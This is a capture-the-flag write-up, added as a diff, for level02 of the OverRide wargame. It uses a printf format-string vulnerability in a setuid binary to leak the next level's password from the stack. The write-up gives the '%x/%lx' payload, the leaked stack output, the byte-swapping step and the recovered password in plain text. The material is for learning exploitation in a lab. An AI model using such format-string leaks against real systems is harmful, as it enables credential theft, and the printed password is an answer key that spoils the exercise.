@@ -1,0 +1,58 @@
+
+```bash
+level02@OverRide:~$ ls -la
+total 21
+dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
+-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
+-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
+level02@OverRide:~$ file level02 
+level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
+
+```
+
+```
+level02@OverRide:~$ objdump -s .rodata level02 
+ 400d18 2a2a2a2a 2a2a2a2a 2a004772 65657469  *********.Greeti
+ 400d28 6e67732c 20257321 0a002f62 696e2f73  ngs, %s!../bin/s
+ 400d38 68002064 6f657320 6e6f7420 68617665  h. does not have
+ 400d48 20616363 65737321 00                  access!.  
+```
+
+Gdb does not work :
+```
+(gdb) break *0x0000000000400a58
+Breakpoint 1 at 0x400a58
+(gdb) x/30s rbp-0x110
+No symbol table is loaded.  Use the "file" command.
+(gdb) r
+Starting program: /home/users/level02/level02 
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+ERROR: failed to open password file
+[Inferior 1 (process 1780) exited with code 01]
+```
+
+But we can prob with `printf` vunerability:
+```
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %lx %lx %lx %lx %lx %x %x
+--[ Password: BBBB
+*****************************************
+AAAA ffffe4f0 0 42 2a2a2a2a 2a2a2a2a ffffe6e8 f7ff9a08 42424242 0 0 0 0 0 0 0 0 0 0 0 0 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d feff00 41414141 does not have access!
+```
+
+We see on the stack some value after password:
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+
+We change to big indian and convert it to a string and we get the pass:
+4868373452506E75 51397361354A4145 58674E5743717A37 7358476E68354A35 4D394B6650673348
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
